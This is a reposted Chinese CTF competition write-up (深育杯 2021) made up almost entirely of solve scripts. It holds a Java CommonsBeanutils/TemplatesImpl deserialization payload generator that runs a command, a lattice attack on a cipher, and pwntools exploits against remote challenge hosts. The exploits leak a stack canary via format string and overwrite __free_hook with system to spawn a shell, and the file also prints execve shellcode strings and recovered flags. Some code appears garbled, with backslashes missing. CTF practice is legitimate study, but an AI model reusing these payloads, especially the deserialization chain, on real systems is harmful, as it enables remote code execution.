# 深育杯-WriteUp

> 原文: https://www.ctfiot.com/10032.html
> ID: 10032

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * @author ying
 * @Description
 * @create 2021-11-14 11:16 PM
 */

public class weblog {
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws NoSuchFieldException, IllegalAccessException {
        final Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec("calc");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(b);
        oos.writeObject(queue);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(b.toByteArray()));
    }
}
h = 3967900409518491437091166715380802161532841159072519563471354336400750930009970177101953304861954502146570721506995224520631716261108071684882841102381144720177664434981608584075201907891964214604246219441325377602163957172642582158192223452845671007585556951922415200415538060247456213608112360361636912703380306386439846269645696750929811607783895294670639202472465920599542568227657152922843001792754116981992696203788298740550812661583820191877594185184758074771316815650833195023325150218113883046328740408517222933980589974912467363367727038230703152354450353199257411964288022409128890352346036423792759938468964462267528727695183747947515480432786669353434638860350849296620606820894819933050645748656981993408399675189724419997805599649975500093890450393421897803267909569938850674774386012819838940544502656293639875120854745249463561940935651895728242282430164407574626178693654713011323376912585958110558532953333
p = 4407206782832544188667944201727813617189883940490534227436068867901196311508151544316989531306678865408607390128649278629254128753967046691736522108356971272311308455619879297358588727267184200777923695048248757115057072357087881336680504033511958280710547178971268670442650871890760916203109226852889599638484429889898210426540567794020013920566784973281560628666918122674783539653720295629054898529900882965691587718212291373734218555167591690910246380516121338139063419587750344469214004539520017140593342859857394308703001939640899189432836134392830208318268131639318655382175643272565186884496188876341460968563623529229713790076050095498053846983536874648190033735162809614805624209827336432223553914651838063614534617044557310972056169869738746432924853953258079006936103497626054364115282007843847693813896856977882285910369660539092462408790126385881581833165309032853389777355480169212478669139225609058338565029211
c = 4052491539376955553220568757544621659293304958837707160681090710624505862889512520190589879197831394720145909992216099963759496125523078969015706069688556356682711471641851937470179182960755800968587551608595725470945584970094036299764623894583379909329996337429067328575804567222496890803396234507278490116354758303807070775249711087938549824010697869930856205244006491475201993228121418890520174179969294094963249013786611889790711801269524919695653453576043288934196952437164829830756439734795068980207758771052483500272264363028346668629397497794792110170275173209377114274164087320163340547019935562316429227119346802124620682293405375798340275679831750482339301440428527223801872439611461272229275824994734898078664180541096159146759378804836952981089673755590353588900522455968721971944276318473421193690310601002295637581030417570868955379815661133148339565983621730401675643094909263098778572081973142223744746526672

v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
grid = matrix([v1,v2])

f, g = grid .LLL()[0]

f,g = -f,-g
a = f*c % p % g
m = a * inverse_mod(f*f, g) % g
print(bytes.fromhex(hex(m)[2:]))
from pwn import *
context.log_level = 'debug'
# p = process('./find_flag')
p = remote('192.168.41.122', 2001)
def lauch_gdb():
    context.terminal = ['terminator', '-x', 'sh', '-c']
    gdb.attach(p)

# lauch_gdb()
p.sendlineafter("Hi! What's your name? ", '%17$llx, %15$llx')
p.recvuntil('Nice to meet you, ')
canary = int(('0x' + p.recv(16)), 16)
p.recvuntil(', ')
elfbase = int(('0x' + p.recv(12)), 16) - 0x1140
log.success('leak: 0x%xneflbase: 0x%x' %(canary, elfbase))
backdoor = elfbase + 0x1228
p.sendlineafter('Anything else? ', 'a' * 56 + p64(canary) + p64(0) + p64(backdoor))
p.interactive()
# Sangfor{fl6iEli5bgStQ7nqR1g+auHlCFt5i1M2}
# _*_ coding:
utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './create_code'
    #elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
p = remote("192.168.41.122", 2007)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
 debug_str = ""
 if PIE:
  text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
  for i in addr:
   debug_str+='b *{}n'.format(hex(text_base+i))
  gdb.attach(p,debug_str) 
 else:
  for i in addr:
   debug_str+='b *{}n'.format(hex(i))
  gdb.attach(p,debug_str) 

def dbg():
 gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
bp      = lambda bkp                :
pdbg.bp(bkp)
li      = lambda str1,data1         :
log.success(str1+'========>'+hex(data1))

 
def dbgc(addr):
 gdb.attach(p,"b*" + hex(addr) +"n c")

def lg(s,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))

sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
    #https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
 sla("> ",str(idx))

def add(con):
    choice(1)
    sa("content: ",con)
    # sla("Size: ",sz)
    # sa("content?",cno)

def delete(idx):
 choice(3)
 sla("id: ",idx)

def show(idx):
 choice(2)
 sla("id: ",idx)

# def edit(idx,con):
#     choice(2)
#     sla("Index: ",idx)
#     # sla("size?",sz)
#     sa("Content: ",con)

”

def exp():
 # debug([0x14C0])
 # add(p32(0xF012F012)+'aaaa')
 # show(0)
 # show(-4)
 
 for i in range(10):
  add(str(i)+'aaaaaaaaaaaa')
 add(10*(p64(0)+p64(0x331)))
 delete(5)
 size = 0x330*2+1
 code = 0x320*'x'+p64(0)+p64(size)+p64(0x1000)
 add(code)
 delete(8)

 delete(5)
 delete(4)
 delete(1)
 add(code)
 show(1)
 ru('x10')
 data = uu64('x10'+r(5))
 lg('data',data)
 ru('xe0')
 l_off = uu64('xe0'+r(5))
 lg('l',l_off)
 addr = l_off + 0x7f4255628000 - 0x00007f4255813be0
 lg('addr',addr)
 fh = addr + libc.sym['__free_hook']
 sys = addr + libc.sym['system']
 #--------------------------------
 # delete(9)
 delete(2)
 size = 0x331
 code = 0x320*'x'+p64(0)+p64(size)+p64(fh-0x10)
 add(code)
 add('pad')
 add('x00'*0x10+p64(sys))
 delete(6)
 code = 0x320*'x'+p64(0)+p64(size)+'/bin/shx00'
 add(code)
 delete(2)

 # dbg()
 it()
if __name__ == '__main__':
 exp()
# _*_ coding:
utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './writebook'
    #elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p = remote("192.168.41.122", 2002)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
 debug_str = ""
 if PIE:
  text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
  for i in addr:
   debug_str+='b *{}n'.format(hex(text_base+i))
  gdb.attach(p,debug_str) 
 else:
  for i in addr:
   debug_str+='b *{}n'.format(hex(i))
  gdb.attach(p,debug_str) 

def dbg():
 gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
bp      = lambda bkp                :
pdbg.bp(bkp)
li      = lambda str1,data1         :
log.success(str1+'========>'+hex(data1))

 
def dbgc(addr):
 gdb.attach(p,"b*" + hex(addr) +"n c")

def lg(s,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))

sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
    #https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
 sla("> ",str(idx))

def add(ty,sz):
    choice(1)
    sla("> ",ty)
    # sla("Index: ",idx)
    sla("size: ",sz)
    # sa("content?",cno)

def delete(idx):
    choice(4)
    sla("Page: ",idx)

def show(idx):
    choice(3)
    sla("Page: ",idx)
    # sla("size?",sz)
    # sa("Content: ",con)

def edit(idx,con):
    choice(2)
    sla("Page: ",idx)
    # sla("size?",sz)
    sa("Content: ",con)

def exp():
 #debug([0x7B9])
 for i in range(7):
  add(1,0xf0)
 # for i in range(7):
  

 add(1,0xf0)#7
 add(2,0x1a8)#8
 add(1,0xe8)
 add(1,0xe8)#10
 add(2,0x1a8)
 add(2,0x1a8)
 edit(11,(p64(0x100)+p64(0xb1))*0x14+'n')
 for i in range(7):
  delete(i)
 delete(10)
 # delete(0)
 add(1,0xe8)
 edit(0,0xe0*'x'+p64(0xf0*2+0x1b0+0x100)+'n')
 delete(7)
 delete(11)
 delete(9)

 add(2,0x110)
 show(1)
 ru("Content: ")
 data = uu64(r(6))
 lg('data',data)
 addr = data - 0x00007fdcfb96f0f0 + 0x7fdcfb583000
 lg('addr',addr)
 fh = addr + libc.sym['__free_hook']
 sys = addr + libc.sym['system']

 #--------------------
 add(2,0x1e0)
 edit(2,0x180*'x'+p64(0)+p64(0xf1)+p64(fh)+'n')
 add(1,0xe8)
 add(1,0xe8)
 edit(4,p64(sys)+'n')
 edit(3,'/bin/shx00n')
 delete(3)

 # dbg()
 it()
if __name__ == '__main__':
 exp()
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
ptr[0] += 1;
while (ptr[0]) {
ptr[0] -= 1;
ptr[1] += 16;
}
ptr[0] = get();
while (ptr[0]) {
ptr[0] -= 1;
ptr[1] -= 1;
}
while (ptr[2]) {
ptr[2] -= 1;
}
ptr[2] += 1;
ptr[2] += 1;
ptr[2] += 1;
ptr[2] += 1;
ptr[2] += 1;
ptr[1] += 1;
ptr[1] += 1;
put(ptr[1]);

import os

model = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
model += ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
model += ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '{', '}']

flag = ['']*56

hack_value = [0x60,0xe1,0x2f,0x05,0x79,0x80,0x5e,0xe1,0xc5,0x57,0x8b,0xcc,0x5c,0x9a,0x67,0x26,0x1e,0x19,0xaf,0x93, 0x3f,0x09,0xe2,0x97,0x99,0x7b,0x86,0xc1,0x25,0x87,0xd6,0x0c,0xdd,0xcf,0x2a,0xf5,0x65,0x0e,0x73,0x59,0x1d,0x5f,0xa4,0xf4,0x65,0x68,0xd1,0x3d,0xd2,0x98,0x5d,0xfe,0x5b,0xef,0x5b,0xcc]

for i in range(len(hack_value)):
    for value in model:
        flag[i] = value
        f = open('flag', 'w')
        f.write(''.join(flag[:i+1]))
        f.close()
        os.system('./press')
        f=open('out', 'rb')
        result = f.read()
        f.close()
        s = [ord(x) for x in  result]
        if s[i] == hack_value[i]:
            print(''.join(flag))
            os.remove("out")
            break
        os.remove("out")
Sangfor{mxhZ3tkZTBiZDY3ZS02ZDI1LTg3ZDctMTg3Ni1hZDEzMWE2MTY1Y2J9}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/9-1636939653.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/2-1636939654.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/0-1636939655.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/0-1636939655-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/5-1636939656.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/5-1636939656-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/7-1636939656.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/6-1636939657.jpeg)